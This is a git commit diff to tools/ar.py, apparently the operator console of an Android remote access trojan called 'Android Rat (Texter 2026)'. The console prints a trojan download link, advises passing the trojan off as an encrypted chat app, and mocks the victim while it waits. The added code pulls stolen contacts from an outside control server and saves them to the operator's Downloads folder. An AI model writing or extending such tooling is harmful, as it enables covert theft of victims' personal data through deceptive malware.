a24275567ed456e37dff02ad2e7cdc3967ef0ae0
DemiGodVoid <162964001+DemiGodVoid@users.noreply.github.com>
2026-06-23 17:11:49 -0500

    Update ar.py

--- tools/ar.py
+++ tools/ar.py
@@ -40,13 +40,25 @@ while True:
                                          NAME: Android Rat (Texter 2026)
 
                       """)
-                print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                          {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
+                print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                         {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
                 print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...{RESET}")
                 
         else:
             print(f"Received status code {response.status_code}")
     except Exception as e:
         print(f"Error fetching data, Content might be too large to gather. Download it.: {e}") # Remember to implent a download function
-        os.system('clear')
+        user_input = input("Download content? Y/N: ")
+        if user_input.strip().lower() == 'y':
+            try:
+                download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
+                response = requests.get(download_url)
+                if response.status_code == 200:
+                    with open(os.path.expanduser('~/Downloads/contacts.txt'), 'w') as file:
+                        file.write(response.text)
+                    print("File downloaded successfully to Downloads folder.")
+                else:
+                    print(f"Failed to download file. Status code: {response.status_code}")
+            except Exception as e:
+                print(f"Error during download: {e}")
+        break
 
-    time.sleep(2)
